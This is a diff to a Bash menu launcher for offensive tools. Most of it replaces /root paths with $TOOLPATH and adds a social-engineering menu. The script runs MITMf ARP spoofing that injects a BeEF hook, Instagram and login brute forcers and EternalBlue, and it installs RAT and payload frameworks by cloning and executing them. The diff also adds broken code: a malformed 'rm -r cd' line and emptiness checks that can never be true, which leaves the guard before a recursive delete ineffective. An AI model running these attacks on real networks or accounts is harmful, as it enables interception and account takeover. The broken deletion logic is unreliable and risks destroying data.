 				echo -e "Data source(e.g. "$YS"all"$CE","$YS"google"$CE","$YS"bing"$CE","$YS"yahoo"$CE","$YS"pgp"$CE"): "
 				read INFOSOUR
 				clear
-				cd /root/Infoga
+				cd $TOOLPATH/Infoga
 				python infoga.py -t $INFOTARG -s $INFOSOUR 
 				echo -e "$PAKTGB"
 				$READAK
@@ -5374,10 +5379,10 @@ function information_gathering
 			fi
 		elif [[ "$INFOG" = 5 ]]
 		then
-			if [[ -d /root/KnockMail ]]
+			if [[ -d $TOOLPATH/KnockMail ]]
 			then
 				clear
-				cd /root/KnockMail
+				cd $TOOLPATH/KnockMail
 				python2.7 knock.py
 				cd
 			else
@@ -5393,10 +5398,10 @@ function information_gathering
 			fi
 		elif [[ "$INFOG" = 6 ]]
 		then
-			if [[ -d /root/operative-framework ]]
+			if [[ -d $TOOLPATH/operative-framework ]]
 			then
 				clear
-				cd /root/operative-framework
+				cd $TOOLPATH/operative-framework
 				python2.7 operative.py
 				cd
 			else
@@ -5412,7 +5417,7 @@ function information_gathering
 			fi
 		elif [[ "$INFOG" = "7" ]]
 		then
-			if [[ -d "/root/hakkuframework" ]]
+			if [[ -d "$TOOLPATH/hakkuframework" ]]
 			then
 				while true
 				do
@@ -5510,43 +5515,43 @@ function website_tools
 		else
 			echo -e ""$RS" 1"$CE") "$RS"SQLmap"$CE"                Automatic SQL injection and database takeover tool"
 		fi
-		if [[ -d /root/leviathan ]]
+		if [[ -d $TOOLPATH/leviathan ]]
 		then
 			echo -e ""$YS" 2"$CE") Leviathan             Wide range mass audit toolkit"
 		else
 			echo -e ""$RS" 2"$CE") "$RS"Leviathan"$CE"             Wide range mass audit toolkit"
 		fi
-		if [[ -d /root/NoSQLMap ]]
+		if [[ -d $TOOLPATH/NoSQLMap ]]
 		then
 			echo -e ""$YS" 3"$CE") NoSQLMap              Automated NoSQL exploitation tool"
 		else
 			echo -e ""$RS" 3"$CE") "$RS"NoSQLMap"$CE"              Automated NoSQL exploitation tool"
 		fi
-		if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
+		if [[ -d $TOOLPATH/Yuki-Chan-The-Auto-Pentest ]]
 		then
 			echo -e ""$YS" 4"$CE") Yuki Chan             Automated Pentest Tool"
 		else
 			echo -e ""$RS" 4"$CE") "$RS"Yuki Chan"$CE"             Automated Pentest Tool"
 		fi
-		if [[ -d /root/Blazy ]]
+		if [[ -d $TOOLPATH/Blazy ]]
 		then
 			echo -e ""$YS" 5"$CE") Blazy                 Login bruteforcer/tests for CSRF, Cj, Cloudflare, WAF"
 		else
 			echo -e ""$RS" 5"$CE") "$RS"Blazy"$CE"                 Login bruteforcer/tests for CSRF, Clickjacking, Cloudflare and WAF"
 		fi
-		if [[ -d /root/Striker ]]
+		if [[ -d $TOOLPATH/Striker ]]
 		then
 			echo -e ""$YS" 6"$CE") Striker               An offensive information and vulnerability scanner"
 		else
 			echo -e ""$RS" 6"$CE") "$RS"Striker"$CE"               An offensive information and vulnerability scanner"
 		fi
-		if [[ -d /root/hyprPulse ]]
+		if [[ -d $TOOLPATH/hyprPulse ]]
 		then
 			echo -e ""$YS" 7"$CE") HyprPulse             Brute force multiple accounts at once"
 		else
 			echo -e ""$RS" 7"$CE") "$RS"HyprPulse"$CE"             Brute force multiple accounts at once"
 		fi
-		if [[ -d /root/hyprPulse ]]
+		if [[ -d $TOOLPATH/hyprPulse ]]
 		then
 			echo -e ""$YS" 8"$CE") InstaBurst            A faster way to brute force Instagram"
 		else
@@ -5558,13 +5563,13 @@ function website_tools
 		else
 			echo -e ""$RS" 9"$CE") "$RS"Instagram-py"$CE"          Brute force Instagram without password limiting"
 		fi
-		if [[ -d /root/datasploit ]]
+		if [[ -d $TOOLPATH/datasploit ]]
 		then
 			echo -e ""$YS"10"$CE") Datasploit            Recon on Companies, People, Phone, Bitcoin..."
 		else
 			echo -e ""$RS"10"$CE") "$RS"Datasploit"$CE"            Recon on Companies, People, Phone, Bitcoin..."
 		fi
-		if [[ -d /root/SiteBroker ]]
+		if [[ -d $TOOLPATH/SiteBroker ]]
 		then
 			echo -e ""$YS"11"$CE") SiteBroker            Utility to penetrate and test websites"
 		else
@@ -5592,9 +5597,9 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 2 ]]
 		then
-			if [[ -d /root/leviathan ]]
+			if [[ -d $TOOLPATH/leviathan ]]
 			then
-				cd /root/leviathan
+				cd $TOOLPATH/leviathan
 				python leviathan.py
 			else
 				echo -e "$TNI"
@@ -5608,9 +5613,9 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 3 ]]
 		then
-			if [[ -d /root/NoSQLMap ]]
+			if [[ -d $TOOLPATH/NoSQLMap ]]
 			then
-				cd /root/NoSQLMap
+				cd $TOOLPATH/NoSQLMap
 				python nosqlmap.py
 			else
 				echo -e "$TNI"
@@ -5624,9 +5629,9 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 4 ]]
 		then
-			if [[ -d /root/Yuki-Chan-The-Auto-Pentest ]]
+			if [[ -d $TOOLPATH/Yuki-Chan-The-Auto-Pentest ]]
 			then
-				cd /root/Yuki-Chan-The-Auto-Pentest
+				cd $TOOLPATH/Yuki-Chan-The-Auto-Pentest
 				./yuki.sh
 				echo -e "$PAKTGB"
 				$READAK
@@ -5642,9 +5647,9 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 5 ]]
 		then
-			if [[ -d /root/Blazy ]]
+			if [[ -d $TOOLPATH/Blazy ]]
 			then
-				cd /root/Blazy
+				cd $TOOLPATH/Blazy
 				python blazy.py
 				echo -e "$PAKTGB"
 				$READAK
@@ -5660,9 +5665,9 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 6 ]]
 		then
-			if [[ -d /root/Striker ]]
+			if [[ -d $TOOLPATH/Striker ]]
 			then
-				cd /root/Striker
+				cd $TOOLPATH/Striker
 				python striker.py
 				echo -e "$PAKTGB"
 				$READAK
@@ -5678,9 +5683,9 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 7 ]]
 		then
-			if [[ -d /root/hyprPulse ]]
+			if [[ -d $TOOLPATH/hyprPulse ]]
 			then
-				cd /root/hyprPulse
+				cd $TOOLPATH/hyprPulse
 				python pulsar.py
 				echo -e "$PAKTGB"
 				$READAK
@@ -5696,9 +5701,9 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 8 ]]
 		then
-			if [[ -d /root/InstaBurst ]]
+			if [[ -d $TOOLPATH/InstaBurst ]]
 			then
-				cd /root/InstaBurst
+				cd $TOOLPATH/InstaBurst
 				python instagram.py
 				echo -e "$PAKTGB"
 				$READAK
@@ -5796,11 +5801,11 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 10 ]]
 		then
-			if [[ -d /root/datasploit ]]
+			if [[ -d $TOOLPATH/datasploit ]]
 			then
 				echo -e ""$YS"Domain: "$CE""
 				read DMN
-				cd /root/datasploit
+				cd $TOOLPATH/datasploit
 				python datasploit.py -i "$DMN"
 				echo -e "$PAKTGB"
 				$READAK
@@ -5816,9 +5821,9 @@ function website_tools
 			fi
 		elif [[ "$WEB" = 11 ]]
 		then
-			if [[ -d /root/SiteBroker ]]
+			if [[ -d $TOOLPATH/SiteBroker ]]
 			then
-				cd /root/SiteBroker
+				cd $TOOLPATH/SiteBroker
 				python SiteBroker.py
 				echo -e "$PAKTGB"
 				$READAK
@@ -5850,6 +5855,57 @@ function website_tools
 		#~ $READAK
 	done
 }
+
+function se_tools
+{
+while true
+do
+	printf '\033]2;SOCIAL ENGINEERING\a'
+	clear
+	TERMINALTITLE="SOCIAL ENGINEERING"
+	dash_calc
+	if [[ -d /usr/share/set ]]
+	then
+		echo -e ""$YS" 1"$CE") Social Engineering Toolkit        Toolkit"
+	else
+		echo -e ""$RS" 1"$CE") "$RS"Social Engineering Toolkit"$CE"        Toolkit"
+	fi
+
+	echo -e ""$YS" b"$CE") Go back"
+	echo -e ""$YS" 0"$CE") EXIT"
+	echo -e "Choose: "
+	read -e OTHERT
+	clear
+	if [[ "$OTHERT" = 1 ]]
+	then
+		if [[ -d /usr/share/set ]]
+		then
+			setoolkit
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_set
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = 00 ]]
+	then
+		clear
+		exec bash $0
+	elif [[ "$OTHERT" = "back" || "$OTHERT" = "b" ]]
+	then
+		break
+	elif [[ "$OTHERT" = 0 ]]
+	then
+		clear
+		exit
+	fi
+done
+}
+
 function other_tools
 {
 while true
@@ -5864,41 +5920,47 @@ do
 	else
 		echo -e ""$RS" 1"$CE") "$RS"Geany"$CE"            Best notepad for linux"
 	fi
-	if [[ -d /root/dagon ]]
+	if [[ -d $TOOLPATH/dagon ]]
 	then
 		echo -e ""$YS" 2"$CE") Dagon            Hash cracker/Advanced Hash Manipulation"
 	else
 		echo -e ""$RS" 2"$CE") "$RS"Dagon"$CE"            Hash cracker/Advanced Hash Manipulation"
 	fi
-	if [[ -d /root/LALIN ]]
+	if [[ -d $TOOLPATH/LALIN ]]
 	then
 		echo -e ""$YS" 3"$CE") LALIN            Automatically install any package for pentest "
 	else
 		echo -e ""$RS" 3"$CE") "$RS"LALIN"$CE"            Automatically install any package for pentest "
 	fi
-	if [[ -d /root/cupp ]]
+	if [[ -d $TOOLPATH/cupp ]]
 	then
 		echo -e ""$YS" 4"$CE") Cupp             Make specific worldlists"
 	else
 		echo -e ""$RS" 4"$CE") "$RS"Cupp"$CE"             Make specific worldlists"
 	fi
-	if [[ -d /root/cupp ]]
+	if [[ -d $TOOLPATH/cupp ]]
 	then
 		echo -e ""$YS" 5"$CE") Bleachbit        Free up space"
 	else
 		echo -e ""$RS" 5"$CE") "$RS"Bleachbit"$CE"        Free up space"
 	fi
-	if [[ -d /root/Hash-Buster ]]
+	if [[ -d $TOOLPATH/Hash-Buster ]]
 	then
 		echo -e ""$YS" 6"$CE") Hash Buster      Hash cracker"
 	else
 		echo -e ""$RS" 6"$CE") "$RS"Hash Buster"$CE"      Hash cracker"
 	fi
-	if [[ -d /root/patator ]]
+	if [[ -d $TOOLPATH/patator ]]
 	then
 		echo -e ""$YS" 7"$CE") Patator          Bruteforcer"
 	else
 		echo -e ""$RS" 7"$CE") "$RS"Patator"$CE"          Bruteforcer"
+	fi
+	if [[ -d $TOOLPATH/fsociety ]]
+	then
+		echo -e ""$YS" 8"$CE") FSociety         Toolkit"
+	else
+		echo -e ""$YS" 8"$CE") "$RS"FSociety"$CE"         Toolkit"
 	fi
 	echo -e ""$YS" b"$CE") Go back"
 	echo -e ""$YS" 0"$CE") EXIT"
@@ -5923,7 +5985,7 @@ do
 		fi
 	elif [[ "$OTHERT" = 2 ]]
 	then
-		if [[ -d /root/dagon ]]
+		if [[ -d $TOOLPATH/dagon ]]
 		then
 			dagon_script
 		else
@@ -5939,9 +6001,9 @@ do
 		fi
 	elif [[ "$OTHERT" = 3 ]]
 	then
-		if [[ -d /root/LALIN ]]
+		if [[ -d $TOOLPATH/LALIN ]]
 		then
-			cd /root/LALIN
+			cd $TOOLPATH/LALIN
 			./Lalin.sh
 			cd
 		else
@@ -5956,9 +6018,9 @@ do
 		fi
 	elif [[ "$OTHERT" = "4" ]]
 	then
-		if [[ -d "/root/cupp" ]]
+		if [[ -d "$TOOLPATH/cupp" ]]
 		then
-			cd /root/cupp
+			cd $TOOLPATH/cupp
 			python cupp.py -i
 			cd		
 			echo -e "$PAKTGB"
@@ -5990,9 +6052,9 @@ do
 		fi
 	elif [[ "$OTHERT" = "6" ]]
 	then
-		if [[ -d "/root/Hash-Buster" ]]
+		if [[ -d "$TOOLPATH/Hash-Buster" ]]
 		then
-			cd /root/Hash-Buster
+			cd $TOOLPATH/Hash-Buster
 			python hash.py	
 			echo -e "$PAKTGB"
 			$READAK	
@@ -6008,7 +6070,7 @@ do
 		fi
 	elif [[ "$OTHERT" = "7" ]]
 	then
-		if [[ -d "/root/patator" ]]
+		if [[ -d "$TOOLPATH/patator" ]]
 		then
 			patator_automation
 			echo -e "$PAKTGB"
@@ -6019,6 +6081,23 @@ do
 			if [[ "$INSTALL" = "install" ]]
 			then
 				install_patator
+			else
+				continue
+			fi
+		fi
+	elif [[ "$OTHERT" = "8" ]]
+	then
+		if [[ -d $TOOLPATH/fsociety ]]
+		then
+			fsociety
+			echo -e "$PAKTGB"
+			$READAK	
+		else
+			echo -e "$TNI"
+			read INSTALL
+			if [[ "$INSTALL" = "install" ]]
+			then
+				install_fsociety
 			else
 				continue
 			fi
@@ -6150,7 +6229,7 @@ function metasploit_menu
 		if [[ "$MUSTBEYES" = "YES" ]] 
 		then 
 			clear
-			cd /root/zirikatu
+			cd $TOOLPATH/zirikatu
 			./zirikatu.sh
 		fi
 	elif [[ "$METASP" = "2" ]]
@@ -6288,17 +6367,17 @@ function update_lscript
 			if [[ "$UPDATEYN" = "y" ]]
 			then
 				clear
-				#~ echo -e "Making new directory for the old lscript (will pass it to /root/lscriptold)"
+				#~ echo -e "Making new directory for the old lscript (will pass it to $TOOLPATH/lscriptold)"
 				sleep 1
-				if [[ -d /root/lscriptold ]]
+				if [[ -d $TOOLPATH/lscriptold ]]
 				then
-					rm -r /root/lscriptold
+					rm -r $TOOLPATH/lscriptold
 				fi
-				mkdir /root/lscriptold
+				mkdir $TOOLPATH/lscriptold
 				echo -e ""
 				#~ echo -e "Moving lscript to lscriptold"
 				sleep 1
-				mv "$LPATH" /root/lscriptold
+				mv "$LPATH" $TOOLPATH/lscriptold
 				#~ echo -e "Cloning the latest github version to new "$LPATH""
 				sleep 1
 				cd
@@ -6307,35 +6386,35 @@ function update_lscript
 				chmod +x install.sh
 				clear
 				sleep 1
-				if [[ -f /root/lscriptold/lscript/IAGREE.txt ]]
+				if [[ -f $TOOLPATH/lscriptold/lscript/IAGREE.txt ]]
 				then
-					cp /root/lscriptold/lscript/IAGREE.txt "$LPATH"
+					cp $TOOLPATH/lscriptold/lscript/IAGREE.txt "$LPATH"
 				fi
-				if [[ -d /root/lscriptold/lscript/ks ]]
+				if [[ -d $TOOLPATH/lscriptold/lscript/ks ]]
 				then
 					echo -e "Copying your shortcuts"
-					cp -r /root/lscriptold/lscript/ks "$LPATH"
+					cp -r $TOOLPATH/lscriptold/lscript/ks "$LPATH"
 					echo -e "Done."
 					sleep 0.2
 				fi
-				if [[ -d /root/lscriptold/lscript/settings ]]
+				if [[ -d $TOOLPATH/lscriptold/lscript/settings ]]
 				then
 					echo -e "Copying your settings"
-					cp -r /root/lscriptold/lscript/settings "$LPATH"
+					cp -r $TOOLPATH/lscriptold/lscript/settings "$LPATH"
 					echo -e "Done."
 					sleep 0.2
 				fi
-				if [[ -f /root/lscriptold/lscript/wlanmon.txt ]]
+				if [[ -f $TOOLPATH/lscriptold/lscript/wlanmon.txt ]]
 				then
 					echo -e "Copying your interfaces"
-					cp /root/lscriptold/lscript/wlanmon.txt "$LPATH"
+					cp $TOOLPATH/lscriptold/lscript/wlanmon.txt "$LPATH"
 					echo -e "Done."
 					sleep 0.2
 				fi
 				echo -e ""
-				if [[ -f /root/lscriptold/lscript/wlan.txt ]]
+				if [[ -f $TOOLPATH/lscriptold/lscript/wlan.txt ]]
 				then
-					cp /root/lscriptold/lscript/wlan.txt "$LPATH"
+					cp $TOOLPATH/lscriptold/lscript/wlan.txt "$LPATH"
 					echo -e "Done."
 					sleep 0.2
 					clear
@@ -6346,7 +6425,7 @@ function update_lscript
 				gnome-terminal -e ./install.sh
 				clear 
 				sleep 1
-				rm -rf /root/lscriptold
+				rm -rf $TOOLPATH/lscriptold
 				echo -e "Exiting..."
 				sleep 1
 				kill -9 $PPID
@@ -6459,8 +6538,9 @@ function tools_menu
 	echo -e ""$YS" 2"$CE") Remote access"
 	echo -e ""$YS" 3"$CE") Information gathering"
 	echo -e ""$YS" 4"$CE") Webside tools"
-	echo -e ""$YS" 5"$CE") Others"
-	echo -e ""$YS" 6"$CE") Install/reinstall a tool"
+	echo -e ""$YS" 5"$CE") Social-Engineering"
+	echo -e ""$YS" 6"$CE") Others"
+	echo -e ""$YS" 7"$CE") Install/reinstall a tool"
 	echo -e ""$YS" i"$CE") Info"
 	echo -e ""$YS" b"$CE") Go back"
 	#~ echo -e ""$YS"00"$CE") Main menu"
@@ -6482,8 +6562,11 @@ function tools_menu
 			website_tools
 		elif [[ "$CATEG" = "5" ]]
 		then
-			other_tools
+			se_tools
 		elif [[ "$CATEG" = "6" ]]
+		then
+			other_tools
+		elif [[ "$CATEG" = "7" ]]
 		then
 			NOCONFIRM=0
 			reinstall_tools
@@ -7108,9 +7191,9 @@ function wififb_pass
 }
 function sqlmap_menu
 {
-file2="/root/lscript/sqltemp2"
-file3="/root/lscript/sqltemp3"
-file4="/root/lscript/sqltemp34"
+file2="$TOOLPATH/lscript/sqltemp2"
+file3="$TOOLPATH/lscript/sqltemp3"
+file4="$TOOLPATH/lscript/sqltemp34"
 while true
 do
 	clear
@@ -7531,7 +7614,7 @@ do
 			sleep 2
 			continue
 		fi
-		file="/root/lscript/sqltemp"
+		file="$TOOLPATH/lscript/sqltemp"
 		sqlmap -u "$URL" --dbs <<< $'\n\n\n\n\n\n\n\n\n\n' | tee "$file"
 		##Find the line
 		CHECK=$(cat "$file" | grep "available databases ")
@@ -7605,14 +7688,14 @@ done
 }
 function cromos_menu
 {
-	if [[ ! -d /root/cromos ]]
+	if [[ ! -d $TOOLPATH/cromos ]]
 	then
-		echo -e ""$RS"Cromos directory was not found on /root"$CE""
+		echo -e ""$RS"Cromos directory was not found on $TOOLPATH"$CE""
 		echo -e ""$RS"Fix this issue by installing it within lscript"$CE""
 		echo -e "$PAKTGB"
 		$READAK
 	else
-		cd /root/cromos
+		cd $TOOLPATH/cromos
 		while true
 		do
 			clear
@@ -7664,7 +7747,7 @@ function cromos_menu
 				then
 					buildext="bat"
 				fi
-				python cromos.py --extension "$EXID" --build "$buildext" && xdg-open /root/cromos/output/builds
+				python cromos.py --extension "$EXID" --build "$buildext" && xdg-open $TOOLPATH/cromos/output/builds
 				echo -e "$PAKTGB"
 				$READAK
 			elif [[ "$CROM" == 5 ]]
@@ -7692,7 +7775,7 @@ function mitmf_hook
 	TERMINALTITLE="MITMF + BEEF"
 	dash_calc
 	printf '\033]2;MITMF + BEEF\a'
-	if [[ -d /root/MITMf ]]
+	if [[ -d $TOOLPATH/MITMf ]]
 	then
 		TEST=$(ifconfig | grep "$ETH")
 		n=1
@@ -7747,7 +7830,7 @@ function mitmf_hook
 				mitmfhook="$hookch"
 			fi
 			export mitmfhook
-			cd /root/MITMf
+			cd $TOOLPATH/MITMf
 			clear
 			python mitmf.py -i "$mitmfint" --spoof --arp --gateway "$mitmfgate" --target "$mitmftar" --hsts --inject --js-url "$mitmfhook"
 			cd
@@ -8241,7 +8324,7 @@ function ngrok_option
 	while true
 	do
 		clear
-		if [[ -f /root/ngrok ]]
+		if [[ -f $TOOLPATH/ngrok ]]
 		then
 			TERMINALTITLE="NGROK"
 			dash_calc
@@ -8489,7 +8572,7 @@ do
 	ZERO=$(give_ip_take_zero $LLL)
 	export ZERO
 	echo -e ""$BS"Scanning, please wait..."$CE""
-	tempfile="/root/lscript/tempscan.txt"
+	tempfile="$TOOLPATH/lscript/tempscan.txt"
 	xterm -geometry 1x1+9999+999999 -e "arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile"
 	#gnome-terminal -- arp-scan -I "$IPF" "$ZERO"/24 | tee $tempfile
 	clear
@@ -8844,7 +8927,7 @@ function browser_exploiting
 		then
 			if [[ "$inter" = 0 && "$tarer" = 0 ]]
 			then
-				if [[ -d /root/MITMf ]]
+				if [[ -d $TOOLPATH/MITMf ]]
 				then
 						mitmfint="$SINT"
 						export mitmfint
@@ -8877,7 +8960,7 @@ function browser_exploiting
 								mitmfhook="$hookch"
 							fi
 							export mitmfhook
-							cd /root/MITMf
+							cd $TOOLPATH/MITMf
 							clear
 							if [[ "$wholenetwork" == 0 ]]
 							then
@@ -9654,7 +9737,7 @@ function main_options
 		errors_menu
 	elif [[ "$YORNAA" = "etercheck" ]]
 	then
-		if [[ -d /root/wifiphisher ]]
+		if [[ -d $TOOLPATH/wifiphisher ]]
 		then
 			eternalblue_check
 		else
@@ -9667,7 +9750,7 @@ function main_options
 		fi
 	elif [[ "$YORNAA" = "eternalblue" ]]
 	then
-		if [[ -d /root/wifiphisher ]]
+		if [[ -d $TOOLPATH/wifiphisher ]]
 		then
 			eternalblue
 		else
@@ -9680,7 +9763,7 @@ function main_options
 		fi
 	elif [[ "$YORNAA" = "$wififb" ]]
 	then
-		if [[ -d /root/wifiphisher ]]
+		if [[ -d $TOOLPATH/wifiphisher ]]
 		then
 			wififb_attack
 		else
@@ -9712,7 +9795,7 @@ check_if_ks
 #----------------TOOLS---------------
 	function install_default
 	{
-		if [[ "$foldname" == "" ]]
+		if [[ "$TOOLPATH/$foldname" == "" ]]
 		then
 			testgit=$(echo "$gitlink" | grep ".git")
 			if [[ "$testgit" == "" ]]
@@ -9722,17 +9805,17 @@ check_if_ks
 				foldname=$(echo "$gitlink" | cut -d '/' -f2 | cut -d '.' -f1)
 			fi
 		fi
-		if [[ -d "/root/"$foldname"" ]]
+		if [[ -d "$TOOLPATH/"$foldname"" ]]
 		then
 			if [[ "$NOCONFIRM" == 1 ]]
 			then
-					if [[ "$foldname" != "" ]]
+					if [[ "$TOOLPATH/$foldname" != "" ]]
 					then
 						echo -e ""$YS"Removing: "$foldname""$CE""
-						rm -r /root/"$foldname"
-						cd
+						rm -R $TOOLPATH/"$foldname"
+						cd $TOOLPATH/
 						git clone $gitlink	
-						cd "$foldname"
+						cd "$TOOLPATH/$foldname"
 						return 1
 					fi
 			else
@@ -9740,13 +9823,13 @@ check_if_ks
 				read ROIN
 				if [[ "$ROIN" == "y" ]]
 				then
-					if [[ "$foldname" != "" ]]
+					if [[ "$TOOLPATH/$foldname" != "" ]]
 					then
 						echo -e ""$YS"Removing: "$foldname""$CE""
-						rm -r /root/"$foldname"
-						cd
+						rm -R $TOOLPATH/"$foldname"
+						cd $TOOLPATH/
 						git clone $gitlink	
-						cd "$foldname"
+						cd "$TOOLPATH/$foldname"
 						return 1
 					fi
 				else
@@ -9754,16 +9837,16 @@ check_if_ks
 				fi
 			fi
 		else 
-			cd
+			cd "$TOOLPATH"
 			git clone $gitlink	
-			cd "$foldname"
+			cd "$TOOLPATH/$foldname"
 			return 1
 		fi
 	}
 	function install_fluxion
 	{
 		foldname="fluxion"
-		gitlink="--recursive  https://github.com/FluxionNetwork/fluxion.git"
+		gitlink="https://github.com/FluxionNetwork/fluxion.git"
 		install_default
 		#~ wget https://fluxion.tk/fluxion-unstable.zip
 		#~ apt-get install -y unzip
@@ -9813,6 +9896,7 @@ check_if_ks
 	{
 		foldname="hakkuframework"
 		gitlink="https://github.com/4shadoww/hakkuframework.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9825,6 +9909,7 @@ check_if_ks
 	{
 		foldname="Trity"
 		gitlink="https://github.com/toxic-ig/Trity.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9836,6 +9921,7 @@ check_if_ks
 	{
 		foldname="cupp"
 		gitlink="https://github.com/Mebus/cupp.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9847,6 +9933,7 @@ check_if_ks
 	{
 		foldname="Dracnmap"
 		gitlink="https://github.com/Screetsec/Dracnmap.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9861,12 +9948,12 @@ check_if_ks
 			echo -e "Removing old..."
 			echo -e "$PAKTC"
 			$READAK
-			rm -r /root/Fern-Wifi-Cracker
+			rm -r cd $TOOLPATH/Fern-Wifi-Cracker
 		fi		
 		echo -e "Installing Fern"
 		echo -e "Tool by Savio-code"
 		sleep 1
-		cd 
+		cd $TOOLPATH
 		svn checkout http://github.com/savio-code/fern-wifi-cracker/trunk/Fern-Wifi-Cracker/
 		cd Fern-Wifi-Cracker
 		chmod +x execute.py	
@@ -9876,6 +9963,7 @@ check_if_ks
 		apt-get install -y nmap
 		foldname="kickthemout"
 		gitlink="https://github.com/k4m4/kickthemout.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9887,6 +9975,7 @@ check_if_ks
 	{
 		foldname="ghost-phisher"
 		gitlink="https://github.com/savio-code/ghost-phisher.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9898,6 +9987,7 @@ check_if_ks
 	{
 		foldname="The-Eye"
 		gitlink="https://github.com/EgeBalci/The-Eye.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9909,6 +9999,7 @@ check_if_ks
 	{
 		foldname="xerxes"
 		gitlink="https://github.com/zanyarjamal/xerxes.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9920,6 +10011,7 @@ check_if_ks
 	{
 		foldname="mdk3-master"
 		gitlink="https://github.com/wi-fi-analyzer/mdk3-master.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9932,6 +10024,7 @@ check_if_ks
 	{
 		foldname="KatanaFramework"
 		gitlink="https://github.com/PowerScript/KatanaFramework.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9944,6 +10037,7 @@ check_if_ks
 	{
 		foldname="airgeddon"
 		gitlink="https://github.com/v1s1t0r1sh3r3/airgeddon.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9955,6 +10049,7 @@ check_if_ks
 	{
 		foldname="4nonimizer"
 		gitlink="https://github.com/Hackplayers/4nonimizer.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9962,7 +10057,7 @@ check_if_ks
 			chmod +x 4nonimizer
 			./4nonimizer install
 			clear
-			cd
+			cd 
 			apt-get install -y python-pip
 			apt-get install -y php-curl
 			gem install pcaprub
@@ -9973,6 +10068,7 @@ check_if_ks
 	{
 		foldname="BeeLogger"
 		gitlink="https://github.com/4w4k3/BeeLogger.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -9990,6 +10086,7 @@ check_if_ks
 	{
 		foldname="ezsploit"
 		gitlink="https://github.com/rand0m1ze/ezsploit.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10001,6 +10098,7 @@ check_if_ks
 	{
 		foldname="pupy"
 		gitlink="https://github.com/n1nj4sec/pupy.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10015,6 +10113,7 @@ check_if_ks
 	{
 		foldname="zirikatu"
 		gitlink="https://github.com/pasahitz/zirikatu.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10026,12 +10125,14 @@ check_if_ks
 	{
 		foldname="WiFi-autopwner"
 		gitlink="https://github.com/Mi-Al/WiFi-autopwner.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_bully
 	{
 		foldname="bully"
 		gitlink="https://github.com/aanarchyy/bully.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10045,6 +10146,7 @@ check_if_ks
 	{
 		foldname="kali-anonsurf"
 		gitlink="https://github.com/Und3rf10w/kali-anonsurf.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10057,6 +10159,7 @@ check_if_ks
 	{
 		foldname="anonym8"
 		gitlink="https://github.com/HiroshiManRise/anonym8.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10079,12 +10182,13 @@ check_if_ks
 	function install_angryip
 	{
 		cd
-		if [[ -f "/root/ipscan_*" ]]
+		if [[ -f "$TOOLPATH/ipscan_*" ]]
 		then
 			echo -e "Removing old file"
 			sleep 2
-			rm -f /root/ipscan_*
+			rm -f $TOOLPATH/ipscan_*
 		fi
+		cd $TOOLPATH
 		echo -e "Downloading angryipscanner"
 		sleep 2
 		wget https://github.com/angryip/ipscan/releases/download/3.5.2/ipscan_3.5.2_amd64.deb
@@ -10097,6 +10201,7 @@ check_if_ks
 	{
 		foldname="Sn1per"
 		gitlink="https://github.com/1N3/Sn1per.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10109,18 +10214,21 @@ check_if_ks
 	{
 		foldname="ReconDog"
 		gitlink="https://github.com/UltimateHackers/ReconDog.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_redhawk
 	{
 		foldname="RED_HAWK"
 		gitlink="https://github.com/Tuhinshubhra/RED_HAWK.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_winpayloads
 	{
 		foldname="Winpayloads"
 		gitlink="https://github.com/nccgroup/Winpayloads.git"
+		cd $TOOLPATH
 		install_default
 		cloned=$?
 		if [[ "$cloned" == 1 ]]
@@ -10135,12 +10243,14 @@ check_if_ks
 		cd
 		foldname="CHAOS"
 		gitlink="https://github.com/tiagorlampert/CHAOS.git"
+		cd $TOOLPATH
 		install_default
 	}
 	function install_routersploit
 	{
 		foldname="routersploit"
